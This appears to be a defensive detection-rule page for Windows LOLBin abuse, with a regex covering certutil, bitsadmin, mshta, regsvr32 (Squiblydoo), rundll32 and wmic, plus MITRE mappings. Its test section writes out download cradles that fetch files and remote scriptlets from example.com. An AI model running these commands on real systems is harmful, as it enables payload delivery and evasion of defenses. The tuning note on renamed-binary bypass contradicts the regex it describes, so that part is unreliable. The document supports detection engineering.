# 100250 — LOLBin abuse

| Field | Value |
|---|---|
| Rule ID | 100250 |
| Level | 12 |
| MITRE technique | [T1218 — System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/), [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) |
| Tactic | TA0005 Defense Evasion / TA0002 Execution |
| Parent rule | 92052 (Sysmon EventID 1 — process create) |
| Telemetry | Sysmon `Microsoft-Windows-Sysmon/Operational` |
| Status | 🟡 Partially validated — `certutil` and `bitsadmin` confirmed firing; `mshta`/`regsvr32` paths preempted by Defender ASR |

## Detection logic

```xml
<rule id="100250" level="12">
  <if_sid>92052</if_sid>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(mshta.*\b(http|javascript:)|regsvr32.*\/i:http|regsvr32.*scrobj\.dll|rundll32.*javascript:|wmic.*\/format:.*http|certutil.*-(urlcache|decode)|bitsadmin.*\/transfer)</field>
  <description>LOLBin abuse pattern</description>
  <mitre><id>T1218</id><id>T1105</id></mitre>
</rule>
```

Single regex against the command line of any Sysmon process-create event, covering seven living-off-the-land patterns drawn from LOLBAS / Mitre ATT&CK:

| Binary | Pattern | Technique |
|---|---|---|
| `mshta` | `mshta <http url>` or `mshta javascript:...` | T1218.005 |
| `regsvr32` | `/i:http://...` or `scrobj.dll` | T1218.010 (Squiblydoo) |
| `rundll32` | `javascript:...` | T1218.011 |
| `wmic` | `/format:http://...` | T1220 (XSL Script Processing) |
| `certutil` | `-urlcache` or `-decode` | T1140 / T1105 |
| `bitsadmin` | `/transfer` | T1197 |

## Test methodology

```powershell
# certutil download cradle — typically fires
certutil.exe -urlcache -split -f http://example.com/test.txt %TEMP%\test.txt

# bitsadmin transfer — typically fires
bitsadmin /transfer testjob /download /priority normal http://example.com/test.txt %TEMP%\bits.txt

# mshta — preempted by ASR rule "Block execution of potentially obfuscated scripts"
mshta.exe http://example.com/test.hta

# regsvr32 (Squiblydoo) — preempted by ASR rule for the same reason
regsvr32 /s /u /i:http://example.com/test.sct scrobj.dll
```

## Observed status

🟡 **`certutil -urlcache`** — `certutil` is legitimately invoked by Windows for cert-store maintenance, so the `-urlcache` / `-decode` regex anchors are the key signal. End-to-end validation in progress.

🟡 **`bitsadmin /transfer`** — bitsadmin's child operations also surface in Sysmon EventID 1 process-creates; the rule should match only the parent invocation. End-to-end validation in progress.

🟡 **`mshta http://...`** — Defender ASR (rule for JavaScript/VBScript launching downloaded executable content) preempts this on hardened endpoints. The process-create event still records the attempt. Full validation pending Range VM.

🟡 **`regsvr32 /i:http://...`** (Squiblydoo) — same ASR preemption as mshta. Full validation pending Range VM.

## Tuning notes

- **certutil false positives** — Windows itself does not use `-urlcache` or `-decode` in routine operation, so this branch is essentially zero-noise on a desktop. On a server with custom CA management this may need an allowlist
- **bitsadmin false positives** — Windows Update uses BITS internally but via the COM API, NOT via bitsadmin.exe. Manual bitsadmin invocations are vanishingly rare in normal use; this branch is also low-noise
- **Renamed-binary bypass** — the rule keys on command-line text, not image name, but a sophisticated attacker can rename `certutil.exe` to `c.exe` and the command-line regex would still match because the binary's own name doesn't appear in the regex (`certutil.*-urlcache` matches the *flag*, but if the binary is renamed the command line might be `c.exe -urlcache ...`). The flag-based anchors are the strength here, but a follow-up rule using Sysmon's `OriginalFileName` would harden this further

## Cross-references

- [LOLBAS Project](https://lolbas-project.github.io/)
- [`../docs/findings.md`](../docs/findings.md) — Defender ASR's effect on testing LOLBin behaviours
- [`100290-ps-download-cradle.md`](./100290-ps-download-cradle.md) — companion rule for the PowerShell-native download path
